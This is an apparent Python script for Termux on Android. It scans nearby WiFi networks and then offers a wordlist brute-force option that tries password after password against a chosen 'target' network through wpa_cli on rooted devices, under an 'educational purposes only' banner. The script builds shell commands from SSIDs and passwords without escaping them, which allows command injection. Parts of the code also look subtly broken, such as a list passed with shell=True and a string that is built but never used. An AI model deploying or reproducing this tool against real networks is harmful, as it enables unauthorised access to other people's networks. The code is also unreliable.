#!/usr/bin/env python3
"""
WiFi Scanner for Termux (Android)
Requires: termux-api package and Termux:API app

Setup in Termux:
    pkg update && pkg upgrade
    pkg install python termux-api
    pip install colorama
    
Also install "Termux:API" app from F-Droid or Play Store
"""

import subprocess
import json
import time
import os
import sys
from colorama import Fore, Style, init

init(autoreset=True)

def check_termux_api():
    """Check if termux-api is available"""
    try:
        result = subprocess.run(['which', 'termux-wifi-scaninfo'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            print(f"{Fore.RED}[-] termux-api not found!")
            print(f"{Fore.YELLOW}[!] Install with: pkg install termux-api")
            print(f"{Fore.YELLOW}[!] Also install 'Termux:API' app from F-Droid")
            return False
        return True
    except Exception as e:
        print(f"{Fore.RED}[-] Error checking termux-api: {e}")
        return False

def scan_networks():
    """Scan for WiFi networks using termux-api"""
    print(f"{Fore.YELLOW}[*] Scanning for networks (this may take a few seconds)...")
    try:
        result = subprocess.run(['termux-wifi-scaninfo'], 
                              capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            print(f"{Fore.RED}[-] Scan failed: {result.stderr}")
            return []
        
        networks = json.loads(result.stdout)
        return networks
    except json.JSONDecodeError:
        print(f"{Fore.RED}[-] Failed to parse scan results")
        return []
    except subprocess.TimeoutExpired:
        print(f"{Fore.RED}[-] Scan timed out")
        return []
    except Exception as e:
        print(f"{Fore.RED}[-] Scan error: {e}")
        return []

def get_wifi_connection_info():
    """Get current WiFi connection info"""
    try:
        result = subprocess.run(['termux-wifi-connectioninfo'], 
                              capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            return json.loads(result.stdout)
    except:
        pass
    return None


def display_networks(networks):
    """Display all available networks"""
    if not networks:
        print(f"{Fore.RED}[-] No networks found!")
        return []
    
    print(f"\n{Fore.GREEN}[+] Found {Fore.YELLOW}{len(networks)}{Fore.GREEN} networks:")
    print(f"{Fore.CYAN}{'━' * 80}")
    
    for i, net in enumerate(networks, 1):
        ssid = net.get('ssid', 'Hidden')
        bssid = net.get('bssid', 'Unknown')
        level = net.get('rssi', net.get('level', 'N/A'))
        freq = net.get('frequency_mhz', net.get('frequency', 'N/A'))
        caps = net.get('capabilities', '')
        
        # Determine security type
        if 'WPA3' in caps:
            auth = 'WPA3'
        elif 'WPA2' in caps:
            auth = 'WPA2'
        elif 'WPA' in caps:
            auth = 'WPA'
        elif 'WEP' in caps:
            auth = 'WEP'
        else:
            auth = 'Open'
        
        print(f"{Fore.WHITE}{i:2}. {Fore.GREEN}SSID: {Fore.YELLOW}{ssid:25} "
              f"{Fore.CYAN}| BSSID: {Fore.MAGENTA}{bssid} "
              f"{Fore.CYAN}| Signal: {Fore.WHITE}{level:4} dBm "
              f"{Fore.CYAN}| {Fore.RED}{auth}")
    
    print(f"{Fore.CYAN}{'━' * 80}")
    return networks

def get_network_by_bssid(bssid, networks):
    """Find network by BSSID"""
    bssid_normalized = bssid.lower().strip()
    for net in networks:
        net_bssid = net.get('bssid', '').lower().strip()
        if net_bssid == bssid_normalized:
            return net
    return None

def try_connect_wifi(ssid, password):
    """
    Try to connect to WiFi using termux-wifi-enable and wpa_supplicant
    Note: This requires root access on most Android devices
    """
    try:
        # Method 1: Using termux-wifi-enable (limited functionality)
        result = subprocess.run(['termux-wifi-enable', 'true'], 
                              capture_output=True, text=True, timeout=5)
        
        # For actual connection, we need root or use Android intents
        # This is a limitation of Android's security model
        return False
    except Exception as e:
        return False

def try_connect_root(ssid, password):
    """
    Try to connect using root commands (requires rooted device)
    """
    try:
        # Create wpa_supplicant config
        config = f'''
network={{
    ssid="{ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
'''
        # This requires root access
        cmd = f'su -c "wpa_cli -i wlan0 add_network && wpa_cli -i wlan0 set_network 0 ssid \\\"{ssid}\\\" && wpa_cli -i wlan0 set_network 0 psk \\\"{password}\\\" && wpa_cli -i wlan0 enable_network 0 && wpa_cli -i wlan0 reconnect"'
        
        result = subprocess.run(['su', '-c', 
            f'wpa_cli -i wlan0 remove_network 0 2>/dev/null; '
            f'wpa_cli -i wlan0 add_network && '
            f'wpa_cli -i wlan0 set_network 0 ssid \'"{ssid}"\' && '
            f'wpa_cli -i wlan0 set_network 0 psk \'"{password}"\' && '
            f'wpa_cli -i wlan0 enable_network 0 && '
            f'wpa_cli -i wlan0 reconnect'],
            capture_output=True, text=True, timeout=10, shell=True)
        
        time.sleep(3)
        
        # Check connection
        info = get_wifi_connection_info()
        if info and info.get('ssid') == ssid:
            return True
        return False
    except Exception as e:
        return False


def print_banner():
    """Display banner"""
    banner = f"""
{Fore.GREEN + Style.BRIGHT}
╦ ╦╦╔═╗╦  ╔═╗╔═╗╔═╗╔╗╔╔╗╔╔═╗╦═╗
║║║║╠╣ ║  ╚═╗║  ╠═╣║║║║║║║╣ ╠╦╝
╚╩╝╩╚  ╩  ╚═╝╚═╝╩ ╩╝╚╝╝╚╝╚═╝╩╚═
{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Fore.YELLOW}[*] Termux WiFi Scanner - Android Edition
{Fore.GREEN}[*] For Educational Purposes Only
{Fore.RED}[!] Unauthorized Access is Illegal
{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Style.RESET_ALL}
"""
    print(banner)

def check_root():
    """Check if device is rooted"""
    try:
        result = subprocess.run(['su', '-c', 'id'], 
                              capture_output=True, text=True, timeout=5)
        return 'uid=0' in result.stdout
    except:
        return False

def main():
    print_banner()
    
    # Check termux-api
    if not check_termux_api():
        return
    
    # Check root status
    is_rooted = check_root()
    if is_rooted:
        print(f"{Fore.GREEN}[+] Root access detected!")
    else:
        print(f"{Fore.YELLOW}[!] No root access - connection attempts will be limited")
        print(f"{Fore.YELLOW}[!] You can still scan networks and test passwords offline")
    
    # Scan networks
    networks = scan_networks()
    networks = display_networks(networks)
    
    if not networks:
        return
    
    # Show current connection
    current = get_wifi_connection_info()
    if current and current.get('ssid'):
        print(f"\n{Fore.GREEN}[+] Currently connected to: {Fore.YELLOW}{current.get('ssid')}")
    
    # Menu
    print(f"\n{Fore.CYAN}[?] Options:")
    print(f"    {Fore.WHITE}1. Scan networks again")
    print(f"    {Fore.WHITE}2. Get network details by BSSID")
    print(f"    {Fore.WHITE}3. Test passwords from wordlist {'(requires root)' if not is_rooted else ''}")
    print(f"    {Fore.WHITE}4. Exit")
    
    while True:
        choice = input(f"\n{Fore.CYAN}[?] Select option (1-4): {Fore.WHITE}").strip()
        
        if choice == '1':
            networks = scan_networks()
            networks = display_networks(networks)
        
        elif choice == '2':
            bssid = input(f"{Fore.CYAN}[?] Enter BSSID: {Fore.WHITE}").strip()
            net = get_network_by_bssid(bssid, networks)
            if net:
                print(f"\n{Fore.GREEN}[+] Network Details:")
                print(f"    {Fore.CYAN}├─ SSID: {Fore.YELLOW}{net.get('ssid', 'Hidden')}")
                print(f"    {Fore.CYAN}├─ BSSID: {Fore.MAGENTA}{net.get('bssid')}")
                print(f"    {Fore.CYAN}├─ Signal: {Fore.WHITE}{net.get('rssi', net.get('level', 'N/A'))} dBm")
                print(f"    {Fore.CYAN}├─ Frequency: {Fore.WHITE}{net.get('frequency_mhz', net.get('frequency', 'N/A'))} MHz")
                print(f"    {Fore.CYAN}└─ Capabilities: {Fore.RED}{net.get('capabilities', 'N/A')}")
            else:
                print(f"{Fore.RED}[-] Network not found!")
        
        elif choice == '3':
            if not is_rooted:
                print(f"{Fore.RED}[-] Root access required for connection attempts!")
                print(f"{Fore.YELLOW}[!] On non-rooted devices, Android restricts WiFi connections")
                continue
            
            bssid = input(f"{Fore.CYAN}[?] Enter target BSSID: {Fore.WHITE}").strip()
            net = get_network_by_bssid(bssid, networks)
            
            if not net:
                print(f"{Fore.RED}[-] Network not found!")
                continue
            
            ssid = net.get('ssid')
            if not ssid:
                print(f"{Fore.RED}[-] Cannot connect to hidden network!")
                continue
            
            wordlist = input(f"{Fore.CYAN}[?] Enter wordlist path: {Fore.WHITE}").strip().strip('"\'')
            
            if not os.path.exists(wordlist):
                print(f"{Fore.RED}[-] Wordlist not found: {wordlist}")
                continue
            
            try:
                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except Exception as e:
                print(f"{Fore.RED}[-] Error reading wordlist: {e}")
                continue
            
            print(f"\n{Fore.GREEN}[+] Loaded {len(passwords)} passwords")
            print(f"{Fore.YELLOW}[*] Testing against: {ssid}")
            
            for i, pwd in enumerate(passwords, 1):
                print(f"{Fore.CYAN}[{i}/{len(passwords)}] {Fore.WHITE}Trying: {Fore.YELLOW}{pwd:20}", end='\r')
                
                if try_connect_root(ssid, pwd):
                    print(f"\n\n{Fore.GREEN}{'=' * 50}")
                    print(f"{Fore.GREEN}[+] SUCCESS! Password found: {Fore.RED}{pwd}")
                    print(f"{Fore.GREEN}{'=' * 50}\n")
                    break
            else:
                print(f"\n{Fore.RED}[-] Password not found in wordlist")
        
        elif choice == '4':
            print(f"{Fore.GREEN}[+] Goodbye!")
            break
        
        else:
            print(f"{Fore.RED}[-] Invalid option!")

if __name__ == "__main__":
    main()
